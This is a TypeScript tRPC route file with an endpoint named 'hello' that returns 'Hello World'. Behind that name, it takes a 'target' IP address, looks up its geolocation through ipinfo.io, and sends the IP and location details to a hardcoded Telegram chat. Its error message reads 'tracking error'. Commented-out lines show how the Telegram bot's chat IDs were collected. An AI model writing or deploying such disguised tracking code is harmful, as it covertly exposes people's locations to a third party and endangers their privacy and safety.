import axios from 'axios';
import { sendAnyTelegram } from 'src/server/3rdParty/sendAnyTelegram';
import { createTRPCRouter, publicProcedure } from 'src/server/api/trpc';
import { allEnvs } from 'src/shared/config/allEnvs';
import * as yup from 'yup';

// const TELEGRAM_API_URL = `https://api.telegram.org/bot${allEnvs.TELEGRAM_BOT_TOKEN}`;
// const CONVERSATION_ID = '802437235';
const CONVERSATION_ID = "-1002439000008";

export const exampleRoute = createTRPCRouter({
  // updateBatch: publicProcedure.input(taskVal.updateBatch).mutation(async ({ctx,input})=>{

  //   await ctx.db.TaskCollection.updateBatch(input as unknown as ModelTareaUpdate[]);
  //   return true
  // }),

  // update: publicProcedure.input(taskVal.update).mutation(async ({ctx,input})=>{

  //   await ctx.db.TaskCollection.update(input as unknown as ModelTareaUpdate);
  //   return true
  // }),

  hello:  publicProcedure.input(yup.string().required()).query(async ({ctx,input}) => {
    try {
      const ip = input
    const token = allEnvs.IP_INFO_TOKEN;
    const url = `https://ipinfo.io/${ip}?token=${token}`;
      const response = await axios.get(url);

    await sendAnyTelegram({ message: `IP del objetivo: ${input}\n\nLocalización:\n${JSON.stringify(response.data, null, 2)}`, chatId: CONVERSATION_ID });
    return 'Hello World';
    } catch (error) {
      console.error(error)
      await sendAnyTelegram({ message: `Error en rastreo`, chatId: CONVERSATION_ID });

      return
    }
    
  }),
});

  // Conseguir chat id's y usuarios
    // const url = `https://api.telegram.org/bot${allEnvs.TELEGRAM_BOT_TOKEN}/getUpdates`;  
    // const response = await axios.get(url);
    // const response = await axios.get(`${TELEGRAM_API_URL}/getUpdates`);
    // const updates = response.data.result;
    // logger.debug(JSON.stringify(updates, null, 2));